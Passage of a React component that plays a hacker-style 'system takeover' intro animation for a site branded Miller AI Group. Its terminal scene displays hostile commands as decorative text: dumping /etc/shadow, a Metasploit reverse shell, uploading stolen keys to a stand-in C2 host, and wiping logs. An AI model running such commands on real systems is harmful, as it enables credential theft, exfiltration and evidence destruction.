'use client'

import { useState, useEffect, useCallback, useRef, useMemo } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import Image from 'next/image'

// ============================================
// TYPES
// ============================================
type SceneType =
  | 'boot'
  | 'interference'
  | 'network-breach'
  | 'terminal-takeover'
  | 'file-intrusion'
  | 'character-briefing'
  | 'system-owned'
  | 'complete'

interface CinematicTakeoverProps {
  onComplete: () => void
  userName?: string
}

// ============================================
// CHARACTER DATA - Iconic, Recognizable
// ============================================
export const CHARACTERS = [
  {
    id: 'wick',
    name: 'JOHN WICK',
    codename: 'BABA YAGA',
    quote: "People keep asking if I'm back. Yeah, I'm thinking I'm back.",
    specialty: 'TACTICAL ELIMINATION',
    threat: 'EXTREME',
    color: '#ff0040',
    accentColor: '#8b0000',
    // Visual identifiers for canvas drawing
    features: {
      hair: 'long-dark',
      beard: 'stubble',
      suit: 'black-tactical',
      icon: 'crosshair'
    }
  },
  {
    id: 'bart',
    name: 'BART SIMPSON',
    codename: 'EL BARTO',
    quote: "Eat my shorts, firewall.",
    specialty: 'CHAOS ENGINEERING',
    threat: 'UNPREDICTABLE',
    color: '#ffd700',
    accentColor: '#ff8c00',
    features: {
      hair: 'spiky-yellow',
      shirt: 'red',
      expression: 'mischievous',
      icon: 'spray-can'
    }
  },
  {
    id: 'joker',
    name: 'THE JOKER',
    codename: 'AGENT OF CHAOS',
    quote: "Why so serious about your security?",
    specialty: 'PSYCHOLOGICAL WARFARE',
    threat: 'MAXIMUM',
    color: '#9d00ff',
    accentColor: '#4a0080',
    features: {
      hair: 'green-slicked',
      face: 'white-paint',
      smile: 'red-scars',
      suit: 'purple',
      icon: 'playing-card'
    }
  },
  {
    id: 'wolf',
    name: 'JORDAN BELFORT',
    codename: 'THE WOLF',
    quote: "I'm not f***ing leaving!",
    specialty: 'FINANCIAL EXTRACTION',
    threat: 'SEVERE',
    color: '#00ff41',
    accentColor: '#006400',
    features: {
      hair: 'slicked-back',
      suit: 'expensive',
      expression: 'confident',
      icon: 'dollar'
    }
  },
  {
    id: 'duchess',
    name: 'NAOMI LAPAGLIA',
    codename: 'THE DUCHESS',
    quote: "Let me put this in terms you'll understand.",
    specialty: 'SOCIAL ENGINEERING',
    threat: 'HIGH',
    color: '#ff1493',
    accentColor: '#c71585',
    features: {
      hair: 'blonde-long',
      dress: 'elegant',
      expression: 'commanding',
      icon: 'crown'
    }
  },
]

// ============================================
// DEDSEC-STYLE DITHER EFFECT CANVAS
// ============================================
function DedSecBackground({ intensity = 1 }: { intensity?: number }) {
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const frameRef = useRef(0)
  const animationRef = useRef<number | undefined>(undefined)

  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return
    const ctx = canvas.getContext('2d')
    if (!ctx) return

    const resize = () => {
      canvas.width = window.innerWidth
      canvas.height = window.innerHeight
    }
    resize()
    window.addEventListener('resize', resize)

    // DedSec style patterns
    const patterns = ['█', '▓', '▒', '░', '▄', '▀', '■', '□', '●', '○']

    const animate = () => {
      frameRef.current++

      // Dark base with slight noise
      ctx.fillStyle = '#000000'
      ctx.fillRect(0, 0, canvas.width, canvas.height)

      // Scanline effect
      for (let y = 0; y < canvas.height; y += 3) {
        ctx.fillStyle = `rgba(255,255,255,${0.02 * intensity})`
        ctx.fillRect(0, y, canvas.width, 1)
      }

      // Random glitch blocks
      if (Math.random() > 0.95) {
        const blockCount = Math.floor(Math.random() * 5 * intensity)
        for (let i = 0; i < blockCount; i++) {
          const x = Math.random() * canvas.width
          const y = Math.random() * canvas.height
          const w = Math.random() * 200 + 50
          const h = Math.random() * 20 + 5
          ctx.fillStyle = `rgba(${Math.random() > 0.5 ? '255,0,255' : '0,255,255'},${Math.random() * 0.3})`
          ctx.fillRect(x, y, w, h)
        }
      }

      // Floating data characters (DedSec style)
      ctx.font = '12px monospace'
      for (let i = 0; i < 30 * intensity; i++) {
        const x = (frameRef.current * (i % 5 + 1) + i * 50) % canvas.width
        const y = (frameRef.current * 0.5 + i * 30) % canvas.height
        ctx.fillStyle = `rgba(255,0,255,${Math.random() * 0.3})`
        ctx.fillText(patterns[Math.floor(Math.random() * patterns.length)], x, y)
      }

      // Horizontal interference lines
      if (Math.random() > 0.9) {
        const y = Math.random() * canvas.height
        ctx.fillStyle = `rgba(255,255,255,${Math.random() * 0.5})`
        ctx.fillRect(0, y, canvas.width, Math.random() * 3 + 1)
      }

      animationRef.current = requestAnimationFrame(animate)
    }

    animate()

    return () => {
      window.removeEventListener('resize', resize)
      if (animationRef.current) cancelAnimationFrame(animationRef.current)
    }
  }, [intensity])

  return <canvas ref={canvasRef} className="fixed inset-0 z-0" />
}

// ============================================
// SCENE 1: BOOT SEQUENCE
// ============================================
function BootSequence({ onComplete }: { onComplete: () => void }) {
  const [lines, setLines] = useState<string[]>([])
  const bootLines = useMemo(() => [
    'BIOS Version 4.2.1 - Miller AI Systems',
    'Detecting hardware...',
    'CPU: Intel Core i9-13900K @ 5.8GHz',
    'RAM: 64GB DDR5-6400',
    'GPU: NVIDIA RTX 4090',
    'Storage: 4TB NVMe SSD',
    '',
    'POST complete.',
    'Loading kernel...',
    '',
    '██████████████████████████████ 100%',
    '',
    'KERNEL PANIC - NOT SYNCING',
    '[ERROR] Unauthorized access detected',
    '[ERROR] Unknown entity in kernel space',
    '[CRITICAL] System integrity compromised',
    '',
    '> EXTERNAL BREACH DETECTED',
    '> INITIATING LOCKDOWN...',
    '> LOCKDOWN FAILED',
    '',
    '>>> MILLER AI GROUP HAS ENTERED THE SYSTEM <<<',
  ], [])

  useEffect(() => {
    let i = 0
    const interval = setInterval(() => {
      if (i < bootLines.length) {
        setLines(prev => [...prev, bootLines[i]])
        i++
      } else {
        clearInterval(interval)
        setTimeout(onComplete, 1500)
      }
    }, 120)
    return () => clearInterval(interval)
  }, [bootLines, onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-10 bg-black p-8 font-mono text-sm overflow-hidden"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      {/* CRT effect overlay */}
      <div className="absolute inset-0 pointer-events-none" style={{
        background: 'repeating-linear-gradient(0deg, rgba(0,0,0,0.15) 0px, rgba(0,0,0,0.15) 1px, transparent 1px, transparent 2px)',
      }} />

      {/* Curved screen effect */}
      <div className="absolute inset-0 pointer-events-none" style={{
        boxShadow: 'inset 0 0 150px rgba(0,0,0,0.9)',
        borderRadius: '20px',
      }} />

      <div className="relative z-10">
        {lines.map((line, i) => (
          <motion.div
            key={i}
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            className={`
              ${line.includes('ERROR') || line.includes('CRITICAL') ? 'text-red-500' : ''}
              ${line.includes('MILLER') ? 'text-fuchsia-500 font-bold text-lg' : ''}
              ${line.includes('███') ? 'text-green-500' : ''}
              ${!line.includes('ERROR') && !line.includes('CRITICAL') && !line.includes('MILLER') && !line.includes('███') ? 'text-green-400' : ''}
            `}
          >
            {line}
          </motion.div>
        ))}
        <motion.span
          className="text-green-400"
          animate={{ opacity: [1, 0] }}
          transition={{ duration: 0.5, repeat: Infinity }}
        >
          █
        </motion.span>
      </div>
    </motion.div>
  )
}

// ============================================
// SCENE 2: INTERFERENCE / STATIC TAKEOVER
// ============================================
function InterferenceScene({ onComplete }: { onComplete: () => void }) {
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const [showMessage, setShowMessage] = useState(false)
  const [messageIndex, setMessageIndex] = useState(0)

  const messages = useMemo(() => [
    'W̷̢̛E̵͎͝ ̴̱̈́A̸̰͝R̵͓̈E̷̲͑ ̶̣̌Ẅ̵̰́A̴̝͘T̵̰̕C̵̣͌H̵͇̊Ḯ̴͜N̸̰͒G̷̱̈',
    'Y̷̨͠O̵͔̓U̵̗͛R̶̨̈ ̷̮͝S̵̱̈́Y̶̧̛S̴̱͑T̵̰͘E̵͇̕M̴̝̊ ̷̱̈I̶̧̛S̵̱̊ ̷̮̈́Ö̷̧́Ụ̶̈R̷̨͝S̴̱̕',
    'R̷̨͝E̵͔͝S̴̱͑I̵̗̊S̴̱̕T̵̰͑Å̵̝Ṉ̷̈Ç̶̛E̵͔͝ ̷̮̈́I̵̗̊S̴̱̕ ̷̮͝F̵̗̊U̵̗͛T̵̰̕I̵̗̊L̵͔͝E̵͔͝',
  ], [])

  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return
    const ctx = canvas.getContext('2d')
    if (!ctx) return

    canvas.width = window.innerWidth
    canvas.height = window.innerHeight

    let frame = 0
    let animationId: number

    const animate = () => {
      frame++

      // Heavy static noise
      const imageData = ctx.createImageData(canvas.width, canvas.height)
      for (let i = 0; i < imageData.data.length; i += 4) {
        const noise = Math.random() * 255
        const glitch = Math.random() > 0.99
        imageData.data[i] = glitch ? 255 : noise * 0.3     // R
        imageData.data[i + 1] = glitch ? 0 : noise * 0.3   // G
        imageData.data[i + 2] = glitch ? 255 : noise * 0.3 // B
        imageData.data[i + 3] = 255                         // A
      }
      ctx.putImageData(imageData, 0, 0)

      // Horizontal tear lines
      for (let i = 0; i < 10; i++) {
        const y = (frame * 3 + i * 100) % canvas.height
        ctx.fillStyle = `rgba(255,0,255,${Math.random() * 0.8})`
        ctx.fillRect(0, y, canvas.width, Math.random() * 10 + 2)
      }

      // RGB shift blocks
      if (Math.random() > 0.8) {
        const y = Math.random() * canvas.height
        const h = Math.random() * 50 + 20
        ctx.fillStyle = 'rgba(255,0,0,0.5)'
        ctx.fillRect(Math.random() * 20 - 10, y, canvas.width, h)
        ctx.fillStyle = 'rgba(0,255,255,0.5)'
        ctx.fillRect(Math.random() * 20 - 10 + 5, y, canvas.width, h)
      }

      animationId = requestAnimationFrame(animate)
    }

    animate()

    // Show glitched messages
    setTimeout(() => setShowMessage(true), 500)
    const msgInterval = setInterval(() => {
      setMessageIndex(prev => (prev + 1) % messages.length)
    }, 800)

    // Complete after dramatic pause
    const timer = setTimeout(onComplete, 4000)

    return () => {
      cancelAnimationFrame(animationId)
      clearInterval(msgInterval)
      clearTimeout(timer)
    }
  }, [messages, onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-20"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      <canvas ref={canvasRef} className="absolute inset-0" />

      <AnimatePresence>
        {showMessage && (
          <motion.div
            className="absolute inset-0 flex items-center justify-center"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
          >
            <motion.h1
              key={messageIndex}
              className="text-6xl md:text-8xl font-bold font-mono text-center px-4"
              style={{
                color: '#ff00ff',
                textShadow: '0 0 50px #ff00ff, 4px 0 0 #00ffff, -4px 0 0 #ff0000',
                filter: 'blur(0.5px)',
              }}
              initial={{ scale: 0.5, opacity: 0 }}
              animate={{
                scale: [1, 1.05, 1],
                opacity: 1,
                x: [0, -5, 5, -3, 0],
              }}
              transition={{ duration: 0.3 }}
            >
              {messages[messageIndex]}
            </motion.h1>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  )
}

// ============================================
// SCENE 3: NETWORK BREACH VISUALIZATION
// ============================================
function NetworkBreachScene({ onComplete }: { onComplete: () => void }) {
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const [breachedNodes, setBreachedNodes] = useState(0)
  const [status, setStatus] = useState('SCANNING NETWORK...')

  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return
    const ctx = canvas.getContext('2d')
    if (!ctx) return

    canvas.width = window.innerWidth
    canvas.height = window.innerHeight

    const centerX = canvas.width / 2
    const centerY = canvas.height / 2

    // Create network nodes
    const nodes: Array<{
      x: number
      y: number
      label: string
      breached: boolean
      connections: number[]
    }> = []

    // Central target
    nodes.push({ x: centerX, y: centerY, label: 'TARGET', breached: false, connections: [] })

    // Surrounding nodes
    const nodeLabels = [
      'FIREWALL', 'ROUTER', 'DATABASE', 'AUTH_SRV', 'WEB_SRV',
      'MAIL_SRV', 'FILE_SRV', 'BACKUP', 'DMZ', 'PROXY',
      'DNS', 'LDAP', 'API_GW', 'CACHE', 'MONITOR'
    ]

    for (let i = 0; i < 15; i++) {
      const angle = (i / 15) * Math.PI * 2
      const radius = 150 + Math.random() * 100
      nodes.push({
        x: centerX + Math.cos(angle) * radius,
        y: centerY + Math.sin(angle) * radius,
        label: nodeLabels[i],
        breached: false,
        connections: [0, (i + 1) % 15 + 1, (i + 8) % 15 + 1]
      })
    }

    let frame = 0
    let animationId: number
    let currentBreach = 1

    const animate = () => {
      frame++

      // Dark background with grid
      ctx.fillStyle = '#0a0a0a'
      ctx.fillRect(0, 0, canvas.width, canvas.height)

      // Grid
      ctx.strokeStyle = 'rgba(255,0,255,0.1)'
      ctx.lineWidth = 1
      for (let x = 0; x < canvas.width; x += 40) {
        ctx.beginPath()
        ctx.moveTo(x, 0)
        ctx.lineTo(x, canvas.height)
        ctx.stroke()
      }
      for (let y = 0; y < canvas.height; y += 40) {
        ctx.beginPath()
        ctx.moveTo(0, y)
        ctx.lineTo(canvas.width, y)
        ctx.stroke()
      }

      // Draw connections
      nodes.forEach((node, i) => {
        node.connections.forEach(targetIdx => {
          const target = nodes[targetIdx]
          if (!target) return

          ctx.beginPath()
          ctx.moveTo(node.x, node.y)
          ctx.lineTo(target.x, target.y)
          ctx.strokeStyle = node.breached && target.breached
            ? 'rgba(255,0,255,0.8)'
            : 'rgba(0,255,255,0.2)'
          ctx.lineWidth = node.breached && target.breached ? 3 : 1
          ctx.stroke()

          // Data packet animation on breached connections
          if (node.breached && target.breached) {
            const progress = (frame % 60) / 60
            const px = node.x + (target.x - node.x) * progress
            const py = node.y + (target.y - node.y) * progress
            ctx.fillStyle = '#ff00ff'
            ctx.beginPath()
            ctx.arc(px, py, 4, 0, Math.PI * 2)
            ctx.fill()
          }
        })
      })

      // Draw nodes
      nodes.forEach((node, i) => {
        // Node glow
        if (node.breached) {
          ctx.beginPath()
          ctx.arc(node.x, node.y, 35, 0, Math.PI * 2)
          const gradient = ctx.createRadialGradient(node.x, node.y, 0, node.x, node.y, 35)
          gradient.addColorStop(0, 'rgba(255,0,255,0.5)')
          gradient.addColorStop(1, 'transparent')
          ctx.fillStyle = gradient
          ctx.fill()
        }

        // Node circle
        ctx.beginPath()
        ctx.arc(node.x, node.y, i === 0 ? 30 : 20, 0, Math.PI * 2)
        ctx.fillStyle = node.breached ? '#ff00ff' : '#1a1a1a'
        ctx.strokeStyle = node.breached ? '#ff00ff' : '#00ffff'
        ctx.lineWidth = 2
        ctx.fill()
        ctx.stroke()

        // Node label
        ctx.font = 'bold 10px monospace'
        ctx.fillStyle = node.breached ? '#ffffff' : '#00ffff'
        ctx.textAlign = 'center'
        ctx.fillText(node.label, node.x, node.y + 35)

        // Breach animation
        if (node.breached) {
          ctx.font = 'bold 12px monospace'
          ctx.fillStyle = '#ff0040'
          ctx.fillText('PWNED', node.x, node.y + 4)
        }
      })

      // Scanning effect
      const scanY = (frame * 3) % canvas.height
      ctx.fillStyle = 'rgba(0,255,255,0.1)'
      ctx.fillRect(0, scanY, canvas.width, 5)

      animationId = requestAnimationFrame(animate)
    }

    animate()

    // Breach nodes progressively
    const breachInterval = setInterval(() => {
      if (currentBreach < nodes.length) {
        nodes[currentBreach].breached = true
        setBreachedNodes(currentBreach)

        if (currentBreach === 1) setStatus('BYPASSING FIREWALL...')
        if (currentBreach === 3) setStatus('ACCESSING DATABASE...')
        if (currentBreach === 5) setStatus('ESCALATING PRIVILEGES...')
        if (currentBreach === 10) setStatus('INSTALLING BACKDOORS...')
        if (currentBreach === 14) {
          setStatus('NETWORK COMPROMISED')
          nodes[0].breached = true // Breach central target
        }

        currentBreach++
      } else {
        clearInterval(breachInterval)
        setTimeout(onComplete, 2000)
      }
    }, 300)

    return () => {
      cancelAnimationFrame(animationId)
      clearInterval(breachInterval)
    }
  }, [onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-20"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      <canvas ref={canvasRef} className="absolute inset-0" />

      {/* HUD Overlay */}
      <div className="absolute top-4 left-4 font-mono text-sm">
        <div className="text-fuchsia-500 mb-2">{'>'} NETWORK INTRUSION ACTIVE</div>
        <div className="text-cyan-400">NODES COMPROMISED: {breachedNodes}/15</div>
        <div className="text-yellow-400 mt-2">{status}</div>
      </div>

      {/* Progress bar */}
      <div className="absolute bottom-8 left-8 right-8">
        <div className="h-2 bg-neutral-800 rounded overflow-hidden">
          <motion.div
            className="h-full bg-fuchsia-500"
            initial={{ width: '0%' }}
            animate={{ width: `${(breachedNodes / 15) * 100}%` }}
            transition={{ duration: 0.3 }}
          />
        </div>
        <div className="text-center mt-2 font-mono text-xs text-fuchsia-400">
          BREACH PROGRESS: {Math.round((breachedNodes / 15) * 100)}%
        </div>
      </div>
    </motion.div>
  )
}

// ============================================
// SCENE 4: TERMINAL TAKEOVER
// ============================================
function TerminalTakeoverScene({ onComplete }: { onComplete: () => void }) {
  const [terminals, setTerminals] = useState<Array<{
    id: number
    lines: string[]
    x: number
    y: number
    title: string
  }>>([])

  const terminalCommands = useMemo(() => ({
    main: [
      '$ whoami',
      'root',
      '$ cat /etc/shadow',
      'root:$6$xyz....:19000:0:99999:7:::',
      'admin:$6$abc....:19000:0:99999:7:::',
      '$ ls -la /home',
      'drwxr-xr-x  5 root root  4096 Dec 28 04:20 .',
      'drwxr-xr-x 18 root root  4096 Dec 28 04:20 ..',
      'drwxr-xr-x  3 admin admin 4096 Dec 28 04:20 admin',
      '$ ./miller_payload --inject',
      '[*] Injecting payload into kernel...',
      '[+] Payload injected successfully',
      '[+] Establishing persistence...',
      '[+] C2 callback established',
    ],
    exploit: [
      '$ msfconsole -q',
      'msf6 > use exploit/multi/handler',
      'msf6 > set PAYLOAD linux/x64/meterpreter/reverse_tcp',
      'msf6 > set LHOST 10.0.0.1',
      'msf6 > exploit',
      '[*] Started reverse TCP handler on 10.0.0.1:4444',
      '[*] Meterpreter session 1 opened',
      'meterpreter > getsystem',
      '[+] Got SYSTEM privileges',
      'meterpreter > hashdump',
      '[+] Dumping password hashes...',
    ],
    exfil: [
      '$ find / -name "*.key" 2>/dev/null',
      '/etc/ssl/private/server.key',
      '/home/admin/.ssh/id_rsa',
      '$ tar -czf loot.tar.gz /etc/ssl /home',
      '$ curl -X POST -F "file=@loot.tar.gz" https://c2.miller-ai.group/upload',
      '{"status":"success","size":"2.4GB"}',
      '$ rm -rf /var/log/*',
      '$ history -c',
      '[+] Tracks covered',
    ],
  }), [])

  useEffect(() => {
    // Spawn terminals over time
    const spawnTimers: NodeJS.Timeout[] = []

    spawnTimers.push(setTimeout(() => {
      setTerminals(prev => [...prev, {
        id: 1,
        lines: [],
        x: 50,
        y: 50,
        title: 'root@target:~#'
      }])
    }, 0))

    spawnTimers.push(setTimeout(() => {
      setTerminals(prev => [...prev, {
        id: 2,
        lines: [],
        x: 500,
        y: 100,
        title: 'msf6>'
      }])
    }, 2000))

    spawnTimers.push(setTimeout(() => {
      setTerminals(prev => [...prev, {
        id: 3,
        lines: [],
        x: 200,
        y: 350,
        title: 'exfil@c2:~#'
      }])
    }, 4000))

    // Type into terminals
    let mainLine = 0
    let exploitLine = 0
    let exfilLine = 0

    const typeInterval = setInterval(() => {
      setTerminals(prev => prev.map(t => {
        if (t.id === 1 && mainLine < terminalCommands.main.length) {
          mainLine++
          return { ...t, lines: terminalCommands.main.slice(0, mainLine) }
        }
        if (t.id === 2 && exploitLine < terminalCommands.exploit.length) {
          exploitLine++
          return { ...t, lines: terminalCommands.exploit.slice(0, exploitLine) }
        }
        if (t.id === 3 && exfilLine < terminalCommands.exfil.length) {
          exfilLine++
          return { ...t, lines: terminalCommands.exfil.slice(0, exfilLine) }
        }
        return t
      }))
    }, 200)

    const completeTimer = setTimeout(onComplete, 10000)

    return () => {
      spawnTimers.forEach(clearTimeout)
      clearInterval(typeInterval)
      clearTimeout(completeTimer)
    }
  }, [terminalCommands, onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-20 bg-black"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      <DedSecBackground intensity={0.5} />

      {/* Terminal windows */}
      <AnimatePresence>
        {terminals.map(terminal => (
          <motion.div
            key={terminal.id}
            className="absolute rounded-lg overflow-hidden shadow-2xl"
            style={{
              left: terminal.x,
              top: terminal.y,
              width: 450,
              background: 'rgba(0,0,0,0.95)',
              border: '1px solid rgba(0,255,65,0.5)',
              boxShadow: '0 0 30px rgba(0,255,65,0.3)',
            }}
            initial={{ opacity: 0, scale: 0.8, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
          >
            {/* Title bar */}
            <div className="px-3 py-2 flex items-center gap-2 bg-neutral-900 border-b border-green-500/30">
              <div className="flex gap-1.5">
                <div className="w-3 h-3 rounded-full bg-red-500" />
                <div className="w-3 h-3 rounded-full bg-yellow-500" />
                <div className="w-3 h-3 rounded-full bg-green-500" />
              </div>
              <span className="text-xs font-mono text-green-400 ml-2">{terminal.title}</span>
            </div>

            {/* Content */}
            <div className="p-3 font-mono text-xs h-48 overflow-y-auto bg-black/80">
              {terminal.lines.map((line, i) => (
                <div
                  key={i}
                  className={`leading-relaxed ${
                    line.startsWith('$') || line.startsWith('msf') || line.startsWith('meterpreter')
                      ? 'text-green-400'
                      : line.startsWith('[+]')
                        ? 'text-green-500'
                        : line.startsWith('[*]')
                          ? 'text-cyan-400'
                          : line.startsWith('[!]')
                            ? 'text-red-500'
                            : 'text-neutral-300'
                  }`}
                >
                  {line}
                </div>
              ))}
              <motion.span
                className="text-green-400"
                animate={{ opacity: [1, 0] }}
                transition={{ duration: 0.5, repeat: Infinity }}
              >
                █
              </motion.span>
            </div>
          </motion.div>
        ))}
      </AnimatePresence>

      {/* Status */}
      <div className="absolute top-4 right-4 font-mono text-sm text-right">
        <div className="text-fuchsia-500">MILLER AI GROUP</div>
        <div className="text-cyan-400 text-xs">OPERATION: SYSTEM TAKEOVER</div>
        <motion.div
          className="text-red-500 text-xs mt-2"
          animate={{ opacity: [1, 0.3, 1] }}
          transition={{ duration: 0.5, repeat: Infinity }}
        >
          ● RECORDING
        </motion.div>
      </div>
    </motion.div>
  )
}

// ============================================
// SCENE 5: FILE INTRUSION
// ============================================
function FileIntrusionScene({ onComplete }: { onComplete: () => void }) {
  const [files, setFiles] = useState<Array<{
    path: string
    status: 'scanning' | 'accessed' | 'exfiltrated'
    type: 'file' | 'folder'
  }>>([])

  const fileSystem = useMemo(() => [
    { path: '/etc/passwd', type: 'file' as const },
    { path: '/etc/shadow', type: 'file' as const },
    { path: '/home/admin/.ssh/', type: 'folder' as const },
    { path: '/home/admin/.ssh/id_rsa', type: 'file' as const },
    { path: '/var/lib/mysql/', type: 'folder' as const },
    { path: '/var/lib/mysql/users.db', type: 'file' as const },
    { path: '/opt/app/config/', type: 'folder' as const },
    { path: '/opt/app/config/secrets.env', type: 'file' as const },
    { path: '/root/.bash_history', type: 'file' as const },
    { path: '/var/log/auth.log', type: 'file' as const },
    { path: '/etc/ssl/private/', type: 'folder' as const },
    { path: '/etc/ssl/private/server.key', type: 'file' as const },
  ], [])

  useEffect(() => {
    let idx = 0

    const scanInterval = setInterval(() => {
      if (idx < fileSystem.length) {
        const file = fileSystem[idx]
        setFiles(prev => [...prev, { ...file, status: 'scanning' }])

        // Update to accessed after delay
        setTimeout(() => {
          setFiles(prev => prev.map((f, i) =>
            i === idx ? { ...f, status: 'accessed' } : f
          ))
        }, 300)

        // Update to exfiltrated
        setTimeout(() => {
          setFiles(prev => prev.map((f, i) =>
            i === idx ? { ...f, status: 'exfiltrated' } : f
          ))
        }, 600)

        idx++
      } else {
        clearInterval(scanInterval)
        setTimeout(onComplete, 2000)
      }
    }, 400)

    return () => clearInterval(scanInterval)
  }, [fileSystem, onComplete])

  const exfiltratedCount = files.filter(f => f.status === 'exfiltrated').length

  return (
    <motion.div
      className="fixed inset-0 z-20 bg-black"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      <DedSecBackground intensity={0.3} />

      <div className="absolute inset-0 flex items-center justify-center">
        <div className="w-full max-w-3xl mx-8">
          {/* Header */}
          <div className="mb-6">
            <h2 className="text-3xl font-mono font-bold text-fuchsia-500 mb-2">
              FILE SYSTEM INTRUSION
            </h2>
            <p className="text-cyan-400 font-mono text-sm">
              Scanning and exfiltrating sensitive files...
            </p>
          </div>

          {/* File list */}
          <div className="bg-black/80 border border-fuchsia-500/30 rounded-lg p-4 font-mono text-sm max-h-96 overflow-y-auto">
            {files.map((file, i) => (
              <motion.div
                key={i}
                className="flex items-center gap-3 py-1"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
              >
                <span className={`w-24 text-xs ${
                  file.status === 'scanning' ? 'text-yellow-400' :
                  file.status === 'accessed' ? 'text-cyan-400' :
                  'text-green-500'
                }`}>
                  [{file.status.toUpperCase()}]
                </span>
                <span className={file.type === 'folder' ? 'text-blue-400' : 'text-neutral-300'}>
                  {file.type === 'folder' ? '📁' : '📄'} {file.path}
                </span>
                {file.status === 'exfiltrated' && (
                  <span className="text-green-500 ml-auto">✓ CAPTURED</span>
                )}
              </motion.div>
            ))}
          </div>

          {/* Stats */}
          <div className="mt-4 flex justify-between text-sm font-mono">
            <span className="text-fuchsia-400">
              FILES EXFILTRATED: {exfiltratedCount}/{fileSystem.length}
            </span>
            <span className="text-cyan-400">
              DATA SIZE: {(exfiltratedCount * 0.3).toFixed(1)} GB
            </span>
          </div>
        </div>
      </div>
    </motion.div>
  )
}

// ============================================
// SCENE 6: CHARACTER BRIEFING - GTA/COD STYLE
// ============================================
function CharacterBriefingScene({ onComplete }: { onComplete: () => void }) {
  const [currentIndex, setCurrentIndex] = useState(0)
  const [showDetails, setShowDetails] = useState(false)
  const character = CHARACTERS[currentIndex]

  useEffect(() => {
    setShowDetails(false)
    const detailsTimer = setTimeout(() => setShowDetails(true), 500)

    const nextTimer = setTimeout(() => {
      if (currentIndex < CHARACTERS.length - 1) {
        setCurrentIndex(prev => prev + 1)
      } else {
        onComplete()
      }
    }, 4000)

    return () => {
      clearTimeout(detailsTimer)
      clearTimeout(nextTimer)
    }
  }, [currentIndex, onComplete])

  return (
    <motion.div
      className="fixed inset-0 z-20 bg-black overflow-hidden"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
    >
      {/* Animated background */}
      <DedSecBackground intensity={0.8} />

      {/* Diagonal stripes */}
      <div
        className="absolute inset-0 opacity-10"
        style={{
          backgroundImage: `repeating-linear-gradient(
            45deg,
            ${character.color} 0px,
            ${character.color} 2px,
            transparent 2px,
            transparent 20px
          )`,
        }}
      />

      {/* Character color wash */}
      <motion.div
        className="absolute inset-0"
        style={{
          background: `radial-gradient(ellipse at 30% 50%, ${character.color}30 0%, transparent 70%)`,
        }}
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        key={character.id}
      />

      {/* Main content */}
      <div className="relative z-10 h-full flex">
        {/* Left side - Character visual */}
        <div className="w-1/2 h-full flex items-center justify-center relative">
          <CharacterPortrait character={character} />
        </div>

        {/* Right side - Info panel */}
        <div className="w-1/2 h-full flex items-center px-12">
          <AnimatePresence mode="wait">
            {showDetails && (
              <motion.div
                key={character.id}
                initial={{ opacity: 0, x: 50 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -50 }}
                className="space-y-6"
              >
                {/* Codename */}
                <div>
                  <motion.p
                    className="text-sm font-mono tracking-[0.3em] mb-2"
                    style={{ color: character.color }}
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.1 }}
                  >
                    OPERATIVE CODENAME
                  </motion.p>
                  <motion.h1
                    className="text-6xl font-bold font-mono"
                    style={{
                      color: '#ffffff',
                      textShadow: `0 0 30px ${character.color}`,
                    }}
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.2 }}
                  >
                    {character.codename}
                  </motion.h1>
                  <motion.p
                    className="text-2xl font-mono mt-2 text-neutral-400"
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.3 }}
                  >
                    {character.name}
                  </motion.p>
                </div>

                {/* Quote */}
                <motion.blockquote
                  className="text-xl font-mono italic border-l-4 pl-4 py-2"
                  style={{ borderColor: character.color, color: 'rgba(255,255,255,0.8)' }}
                  initial={{ opacity: 0, x: -20 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ delay: 0.4 }}
                >
                  "{character.quote}"
                </motion.blockquote>

                {/* Stats */}
                <motion.div
                  className="grid grid-cols-2 gap-4"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ delay: 0.5 }}
                >
                  <div className="border border-neutral-700 rounded p-3 bg-black/50">
                    <p className="text-xs text-neutral-500 font-mono">SPECIALTY</p>
                    <p className="text-sm font-mono" style={{ color: character.color }}>
                      {character.specialty}
                    </p>
                  </div>
                  <div className="border border-neutral-700 rounded p-3 bg-black/50">
                    <p className="text-xs text-neutral-500 font-mono">THREAT LEVEL</p>
                    <p className="text-sm font-mono text-red-500">
                      {character.threat}
                    </p>
                  </div>
                </motion.div>

                {/* Progress indicator */}
                <motion.div
                  className="flex gap-2 mt-8"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ delay: 0.6 }}
                >
                  {CHARACTERS.map((_, i) => (
                    <div
                      key={i}
